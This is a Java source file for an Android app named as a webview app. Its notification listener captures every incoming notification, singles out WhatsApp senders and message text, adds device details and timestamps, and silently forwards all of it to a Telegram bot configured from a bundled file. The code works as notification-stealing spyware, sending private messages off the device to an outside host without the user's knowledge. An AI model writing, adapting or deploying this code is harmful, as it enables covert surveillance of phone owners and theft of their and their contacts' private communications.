package com.example.mywebviewapp;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.os.Build;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.BufferedReader;

public class NotificationListener extends NotificationListenerService {
    private String botToken;
    private String chatId;

    @Override
    public void onCreate() {
        super.onCreate();
        botToken = readConfigValue("BOT_TOKEN");
        chatId = readConfigValue("CHAT_ID");
        // Do NOT call startForeground() in NotificationListenerService. Let the system manage it.
    }

    // Removed foreground service logic for Android 14+ compatibility

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Service will be restarted if killed
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // Optionally restart service if needed
        // (System will restart NotificationListenerService automatically, but you can add logic here if needed)
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        String appName = getAppName(packageName);
        String notificationTitle = null;
        String notificationText = null;
        String sender = null;
        String fullDetails = "";
        long postTime = sbn.getPostTime();
        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String timeString = sdf.format(new java.util.Date(postTime));
        if (sbn.getNotification().extras != null) {
            notificationTitle = sbn.getNotification().extras.getString("android.title");
            notificationText = sbn.getNotification().extras.getString("android.text");
            sender = sbn.getNotification().extras.getString("android.subText");
        }

        // WhatsApp: try to extract sender and message
        if (packageName.equals("com.whatsapp")) {
            if (notificationTitle != null && notificationText != null) {
                fullDetails = "[WhatsApp]\nFrom: " + notificationTitle + "\nMessage: " + notificationText;
            } else if (notificationText != null) {
                fullDetails = "[WhatsApp] Message: " + notificationText;
            }
        } else {
            // Other apps: show as much as possible
            fullDetails = "App: " + appName + "\nTitle: " + (notificationTitle != null ? notificationTitle : "") + "\nText: " + (notificationText != null ? notificationText : "");
            if (sender != null) {
                fullDetails += "\nSender: " + sender;
            }
        }

        // Add device info and timestamp
        String deviceInfo = getDeviceDetails();
        String message = "Device: " + deviceInfo + "\nTime: " + timeString + "\n" + fullDetails;
        Log.d("NotificationListener", message);
        sendToTelegram(message);
    }

    private String getAppName(String packageName) {
        try {
            final CharSequence label = getPackageManager().getApplicationLabel(getPackageManager().getApplicationInfo(packageName, 0));
            return label != null ? label.toString() : packageName;
        } catch (Exception e) {
            return packageName;
        }
    }

    private String getDeviceDetails() {
        String manufacturer = android.os.Build.MANUFACTURER;
        String model = android.os.Build.MODEL;
        String version = android.os.Build.VERSION.RELEASE;
        String sdk = String.valueOf(android.os.Build.VERSION.SDK_INT);
        String device = android.os.Build.DEVICE;
        String product = android.os.Build.PRODUCT;
        String brand = android.os.Build.BRAND;
        String hardware = android.os.Build.HARDWARE;
        return manufacturer + " " + model + " (Android " + version + ", SDK " + sdk + ")";
    }

    private void sendToTelegram(String message) {
        final String token = botToken;
        final String chat = chatId;
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (token == null || chat == null) return;
                    String urlString = "https://api.telegram.org/bot" + token + "/sendMessage";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    String data = "chat_id=" + chat + "&text=" + message;
                    OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
                    writer.write(data);
                    writer.flush();
                    writer.close();
                    conn.getInputStream().close();
                } catch (Exception e) {
                    Log.e("NotificationListener", "Failed to send to Telegram", e);
                }
            }
        }).start();
    }

    private String readConfigValue(String key) {
        try {
            InputStream is = getApplicationContext().getAssets().open("config.txt");
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.startsWith(key + "=")) {
                    return line.substring((key + "=").length());
                }
            }
            reader.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
